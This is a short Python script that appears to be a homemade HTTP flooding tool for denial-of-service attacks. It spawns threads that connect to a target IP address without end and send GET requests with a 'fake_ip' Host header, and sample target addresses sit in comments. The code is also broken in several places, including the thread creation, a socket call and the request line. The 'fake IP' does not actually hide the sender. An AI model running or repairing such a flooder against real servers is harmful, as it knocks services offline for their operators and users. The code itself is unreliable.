import socket
import threading

# target = '10.0.0.138'
# fake_ip = '182.21.20.32'
# port = 80

attack_num = 0
def attack(target: str, fake_ip: str, port: int):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(('GET /' + target + 'HTTP/1.1\r\n').encode('ascii'), (target, port))
        s.sendto(('Host: ' + fake_ip + '\r\n\r\n').encode('ascii'), target, port)

        global attack_num
        attack_num += 1
        print(attack_num)
        s.close()


def main():
    for i in range(10):
        thread = threading.Thread(target=attack())
        thread.start()

if __name__ == "__main__":
    main()
